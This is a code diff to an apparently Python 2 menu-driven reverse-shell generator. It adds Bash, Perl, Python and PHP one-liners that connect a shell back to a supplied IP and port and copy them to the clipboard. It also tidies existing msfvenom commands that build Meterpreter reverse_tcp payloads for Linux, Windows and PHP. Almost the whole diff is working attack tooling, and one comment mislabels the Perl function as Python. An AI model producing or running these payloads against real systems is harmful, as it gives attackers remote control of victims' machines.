@@ -17,7 +17,7 @@ if len(sys.argv) != 3:
 
 IP_ADDR = sys.argv[1]
 PORT = sys.argv[2]
-
+args = (IP_ADDR,PORT)
 # Main definition - constants
 menu_actions  = {}  
 
@@ -60,6 +60,10 @@ def menu1():
     print "20. Linux MSVENOM"
     print "21. Windows MSVENOM"
     print "22. PHP MSVENOM"
+    print "23. Bash Oneliner"
+    print "24. Perl Oneliner"
+    print "25. Python Oneliner"
+    print "26. PHP Oneliner"
     print "9. Back"
     print "0. Quit"
     choice = raw_input(" >>  ")
@@ -119,19 +123,20 @@ def perl_tty():
 
 #MSVENOM Linux
 def linux_msvenom():
-    shellcode = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % (IP_ADDR,PORT)
+    shellcode = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % args
     msfvenom(shellcode)
 
 #MSVENOM Windows
 def windows_msvenom():
-    shellcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" %(IP_ADDR,PORT)
+    shellcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" % args
     msfvenom(shellcode)
 
 #MSVENOM PHP
 def php_msvenom():
-    shellcode = "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % (IP_ADDR,PORT)
+    shellcode = "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % args
     msfvenom(shellcode)
 
+#MSFVENOM shortcode
 def msfvenom(shellcode):
     warning ="Make sure you are using the correct payload in MSFConsole"
     os.system('clear')
@@ -140,13 +145,39 @@ def msfvenom(shellcode):
     os.system(shellcode)
     print warning
 
+#One liners
+def oneliner(shellcode):
+	print shellcode + " Copied to clipboard"
+	pyperclip.copy(shellcode)
+	sys.exit
+
+#Bash Oneliner
+def bash_oneliner():
+	shellcode = 'bash -i >& /dev/tcp/%s/%s 0>&1' % args
+	oneliner(shellcode)
+
+#Python Oneliner
+def perl_oneliner():
+	shellcode = 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % args
+	oneliner(shellcode)
+
+#Python Oneline
+def python_oneliner():
+	shellcode = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' % args
+	oneliner(shellcode)
+
+#PHP Oneliner
+def php_oneliner():
+	shellcode = 'php -r \'$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'' % args
+
+	oneliner(shellcode)
 # =======================
 #    MENUS DEFINITIONS
 # =======================
  
 # Menu definition
 menu_actions = {
-    'main_menu': main_menu,
+	'main_menu': main_menu,
     '1': menu1,
     '2': menu2,
     '3': python,
@@ -157,6 +188,10 @@ menu_actions = {
     '20': linux_msvenom,
     '21': windows_msvenom,
     '22': php_msvenom,
+    '23': bash_oneliner,
+    '24': perl_oneliner,
+    '25': python_oneliner,
+    '26': php_oneliner,
     '9': back,
     '0': exit,
 }
